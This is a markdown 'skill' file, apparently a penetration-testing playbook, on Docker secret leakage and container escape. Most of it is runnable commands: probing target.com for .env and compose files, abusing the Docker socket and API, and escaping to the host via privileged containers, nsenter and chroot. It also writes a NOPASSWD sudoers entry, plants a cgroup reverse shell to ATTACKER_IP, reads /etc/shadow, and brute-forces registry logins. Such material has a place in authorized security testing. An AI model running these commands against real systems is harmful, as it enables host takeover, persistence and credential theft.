---
name: docker-env-leakage
description: Docker environment variable leakage and container escape - exposed .env files, Docker socket exposure, container breakout, secrets in images
---

# Docker Environment Leakage & Container Escape

## Environment Variable Leakage

### Exposed .env Files
```bash
# Check for exposed .env files
curl -s https://target.com/.env
curl -s https://target.com/.env.local
curl -s https://target.com/.env.production
curl -s https://target.com/.env.backup
curl -s https://target.com/.env.old
curl -s https://target.com/config/.env
curl -s https://target.com/app/.env

# Common locations
for path in .env .env.local .env.production config/.env app/.env src/.env; do
  echo "=== $path ==="
  curl -s https://target.com/$path | head -20
done
```

### Environment Variables in Source Code
```bash
# Check for hardcoded secrets in JavaScript bundles
curl -s https://target.com/static/js/main.js | grep -iE "(api_key|secret|password|token|auth)" | head -20

# Check for environment variables in source maps
curl -s https://target.com/static/js/main.js.map | jq '.sourcesContent[]' | grep -iE "(process\.env|REACT_APP_|VUE_APP_|NEXT_PUBLIC_)"

# Check for exposed config files
curl -s https://target.com/config.json
curl -s https://target.com/config.js
curl -s https://target.com/settings.json
```

### Docker Compose Files
```bash
# Check for exposed docker-compose files
curl -s https://target.com/docker-compose.yml
curl -s https://target.com/docker-compose.yaml
curl -s https://target.com/docker-compose.prod.yml

# Look for:
# - Hardcoded passwords in environment variables
# - Exposed ports
# - Volume mounts with sensitive data
# - Privileged containers
```

### Dockerfile Exposure
```bash
# Check for exposed Dockerfiles
curl -s https://target.com/Dockerfile
curl -s https://target.com/Dockerfile.prod
curl -s https://target.com/docker/Dockerfile

# Look for:
# - ENV instructions with secrets
# - ADD/COPY of sensitive files
# - Hardcoded credentials in RUN commands
# - Base images with known vulnerabilities
```

## Docker Socket Exposure

### Docker Socket Detection
```bash
# Check if Docker socket is exposed (if you have shell access)
ls -la /var/run/docker.sock
ls -la /run/docker.sock

# Check for Docker socket in container
docker ps -a | grep docker.sock

# Check Docker Compose for socket mounts
grep -r "docker.sock" docker-compose.yml
```

### Docker Socket Exploitation
```bash
# If Docker socket is accessible, you have full control

# List all containers
docker ps -a

# Get container details
docker inspect CONTAINER_ID

# Read container environment variables
docker inspect CONTAINER_ID | jq '.[0].Config.Env'

# Execute command in container
docker exec -it CONTAINER_ID /bin/bash

# Read secrets from container
docker exec CONTAINER_ID cat /run/secrets/SECRET_NAME

# Create privileged container to escape
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i bash

# Now you're on the host system
cat /etc/passwd
cat /etc/shadow
```

### Docker API Exposure
```bash
# Check if Docker API is exposed
curl -s http://localhost:2375/version
curl -s http://localhost:2375/containers/json
curl -s http://localhost:2375/images/json

# Common ports: 2375 (unencrypted), 2376 (TLS)
for port in 2375 2376; do
  echo "=== Port $port ==="
  curl -s http://localhost:$port/version
done

# If exposed, you can:
# - List all containers
curl -s http://localhost:2375/containers/json | jq

# - Create new container
curl -X POST http://localhost:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh"],"HostConfig":{"Privileged":true}}'

# - Start container
curl -X POST http://localhost:2375/containers/CONTAINER_ID/start

# - Execute command
curl -X POST http://localhost:2375/containers/CONTAINER_ID/exec \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"Cmd":["cat","/etc/passwd"]}'
```

## Container Escape Techniques

### Privileged Container Escape
```bash
# Check if container is privileged
cat /proc/1/status | grep CapEff
# If CapEff is 0000003fffffffff, container is privileged

# Escape to host
mount -o bind / /mnt
chroot /mnt

# Now you're on the host
cat /etc/passwd
cat /etc/shadow

# Or use nsenter
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### PID Namespace Escape
```bash
# Check if host PID namespace is shared
cat /proc/1/cgroup

# If you can see host processes
ps aux | grep -v "container"

# Access host filesystem via /proc
cat /proc/1/root/etc/passwd
cat /proc/1/root/etc/shadow

# Write to host filesystem
echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /proc/1/root/etc/sudoers
```

### Docker Socket Mount Escape
```bash
# If /var/run/docker.sock is mounted in container
ls -la /var/run/docker.sock

# Create privileged container from within container
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i bash

# Or use Docker API
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# Create new container with host access
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh"],
    "HostConfig": {
      "Privileged": true,
      "PidMode": "host"
    }
  }'
```

### Capabilities Abuse
```bash
# Check container capabilities
cat /proc/1/status | grep Cap

# Decode capabilities
capsh --decode=00000000a80425fb

# Dangerous capabilities:
# - CAP_SYS_ADMIN: mount filesystems, escape container
# - CAP_SYS_PTRACE: debug host processes, inject code
# - CAP_NET_ADMIN: modify network configuration
# - CAP_DAC_OVERRIDE: bypass file permissions

# Exploit CAP_SYS_ADMIN
mount -t cgroup cgroup /mnt
echo 1 > /mnt/cgroup.procs
echo "bash -c 'bash >& /dev/tcp/ATTACKER_IP/4444 0>&1'" > /mnt/notify_on_release
```

### Sensitive Mount Escape
```bash
# Check for sensitive mounts
mount | grep -E "(docker|proc|sys|dev)"

# Common dangerous mounts:
# - /var/run/docker.sock: Docker socket
# - /proc: Host process information
# - /sys: Host system information
# - /dev: Host devices
# - /etc: Host configuration files

# If /proc is mounted, access host processes
cat /proc/1/root/etc/passwd

# If /dev is mounted, access host devices
cat /dev/sda1 > /tmp/disk_image.img
```

## Docker Image Vulnerabilities

### Secrets in Image Layers
```bash
# Pull and inspect image
docker pull target-image:latest
docker history target-image:latest

# Look for:
# - ENV instructions with secrets
# - ADD/COPY of sensitive files
# - RUN commands with hardcoded credentials

# Extract image layers
mkdir image-layers
cd image-layers
docker save target-image:latest | tar -x

# Search for secrets in layers
find . -name "*.tar" -exec tar -tf {} \; | grep -iE "(env|secret|key|password|config)"
for layer in */layer.tar; do
  tar -xf $layer
  grep -r "password\|secret\|api_key" . 2>/dev/null
done
```

### Image Metadata Exposure
```bash
# Inspect image metadata
docker inspect target-image:latest | jq

# Look for:
# - Environment variables
# - Labels with sensitive information
# - Build arguments with secrets
# - Author information

# Check image labels
docker inspect target-image:latest | jq '.[0].Config.Labels'

# Check environment variables
docker inspect target-image:latest | jq '.[0].Config.Env'
```

### Base Image Vulnerabilities
```bash
# Check base image
docker inspect target-image:latest | jq '.[0].Config.Image'

# Scan for vulnerabilities
# Using Trivy
trivy image target-image:latest

# Using Snyk
snyk container test target-image:latest

# Using Clair
clair-scanner target-image:latest

# Look for:
# - Outdated base images with known CVEs
# - Vulnerable packages
# - Unpatched security issues
```

## Docker Registry Attacks

### Exposed Docker Registry
```bash
# Check for exposed Docker registry
curl -s https://target.com:5000/v2/_catalog
curl -s https://registry.target.com/v2/_catalog

# List repositories
curl -s https://target.com:5000/v2/_catalog | jq '.repositories'

# List tags for repository
curl -s https://target.com:5000/v2/REPO_NAME/tags/list

# Pull image from registry
docker pull target.com:5000/REPO_NAME:TAG

# Inspect image
docker inspect target.com:5000/REPO_NAME:TAG | jq
```

### Registry Authentication Bypass
```bash
# Check if registry requires authentication
curl -I https://target.com:5000/v2/

# If 401, authentication is required
# If 200 or 404, registry may be public

# Test for weak credentials
# Default credentials: admin/admin, admin/password
curl -u admin:admin https://target.com:5000/v2/_catalog

# Brute force credentials
for pass in admin password 123456; do
  echo "Testing: admin:$pass"
  curl -u admin:$pass https://target.com:5000/v2/_catalog
done
```

## Testing Checklist

- [ ] Check for exposed .env files
- [ ] Search for environment variables in source code
- [ ] Check for exposed docker-compose.yml files
- [ ] Check for exposed Dockerfiles
- [ ] Test for Docker socket exposure
- [ ] Test Docker API exposure (ports 2375/2376)
- [ ] Check for privileged containers
- [ ] Test container escape via privileged mode
- [ ] Test container escape via PID namespace
- [ ] Test container escape via Docker socket mount
- [ ] Check container capabilities
- [ ] Check for sensitive mounts (/proc, /sys, /dev)
- [ ] Scan Docker images for secrets in layers
- [ ] Check image metadata for sensitive information
- [ ] Scan base images for known vulnerabilities
- [ ] Test for exposed Docker registry
- [ ] Test Docker registry authentication

## Tools

```bash
# Docker CLI
docker ps
docker inspect
docker exec

# Container scanning
# Trivy
trivy image target-image:latest

# Snyk
snyk container test target-image:latest

# Container escape tools
# deepce (Docker Enumeration and Escape)
# https://github.com/stealthcopter/deepce

# cdpe (Container Docker Privilege Escalation)
# https://github.com/AbsoZed/DockerPwn.py

# Nuclei templates for Docker
nuclei -u https://target.com -t ~/nuclei-templates/misconfiguration/docker/
```

## Real-World Impact

**Case 1: Exposed .env File**
- Finding: .env file accessible at https://target.com/.env
- Contents: Database credentials, API keys, JWT secrets
- Impact: Full application compromise, data breach

**Case 2: Docker Socket Exposure**
- Finding: /var/run/docker.sock mounted in container
- Exploitation: Created privileged container, escaped to host
- Impact: Full host compromise, lateral movement

**Case 3: Secrets in Docker Image**
- Finding: API keys in ENV instruction in Dockerfile
- Extraction: Inspected image layers, found hardcoded secrets
- Impact: Third-party service compromise

**Case 4: Exposed Docker Registry**
- Finding: Docker registry accessible without authentication
- Contents: Internal application images with source code
- Impact: Intellectual property theft, credential exposure
